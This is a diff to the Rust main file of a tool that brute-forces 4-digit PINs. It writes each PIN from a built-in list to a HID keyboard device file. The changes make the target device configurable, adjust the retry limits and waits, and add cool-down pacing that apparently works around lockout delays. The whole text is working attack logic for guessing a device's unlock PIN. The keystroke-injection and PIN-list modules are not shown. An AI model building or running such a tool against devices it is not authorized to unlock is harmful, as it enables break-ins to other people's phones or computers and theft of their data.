@@ -1,12 +1,13 @@
 use clap::Parser;
-use common::{parse_cli_args, Cli, Commands, ResumeArgs, Settings, KEYBOARD_DEVICE};
+use common::{parse_cli_args, Cli, Commands, ResumeArgs, Settings};
 use log::{debug, error, info, trace, warn, LevelFilter};
 use simple_logger::SimpleLogger;
-use std::{process::exit, thread, time};
+use std::{process::exit, time::Duration};
 
 mod common;
 mod hid;
 mod pin_lists;
+mod timeout;
 
 fn main() {
     let cli = Cli::parse();
@@ -19,10 +20,10 @@ fn main() {
     };
 
     logger.env().init().unwrap();
+    info!("Starting app...");
 
     let settings = parse_cli_args(&cli);
-
-    debug!("Starting app...");
+    debug!("Loaded settings: {:?}", settings);
 
     match cli.command {
         Some(Commands::Start) => start(settings),
@@ -37,13 +38,14 @@ fn main() {
 }
 
 fn start(settings: Settings) {
-    info!("Starting brute force attack...");
+    debug!("Starting brute force attack...");
 
     let mut cool_down_index = 0;
+    let mut cool_down_count = 0;
 
     for pin in pin_lists::PIN_LIST_4 {
-        let mut result = hid::write_to_device_file(KEYBOARD_DEVICE, pin);
-        let mut attempts = 30;
+        let mut result = hid::write_to_device_file(&settings.device, pin);
+        let mut attempts = 12;
 
         while let Err(e) = result {
             attempts -= 1;
@@ -52,14 +54,25 @@ fn start(settings: Settings) {
             trace!("Error: {}", e);
 
             if attempts == 0 {
-                error!("30 failed attempts, exiting...");
+                error!("12 failed attempts over 2 minutes, exiting...");
                 exit(126); // Command invoked cannot execute
             }
 
             // Wait for 10 seconds before trying again
-            thread::sleep(time::Duration::from_millis(10000));
+            timeout::set_time_out(Duration::from_secs(10), "Retry sending pin in");
 
-            result = hid::write_to_device_file(KEYBOARD_DEVICE, pin);
+            result = hid::write_to_device_file(&settings.device, pin);
+        }
+
+        if settings.cool_down[cool_down_index].count == -1 {
+            continue;
+        }
+
+        if cool_down_count != settings.cool_down[cool_down_index].count {
+            cool_down_count += 1;
+        } else {
+            cool_down_index += 1;
+            cool_down_count = 0;
         }
     }
 }
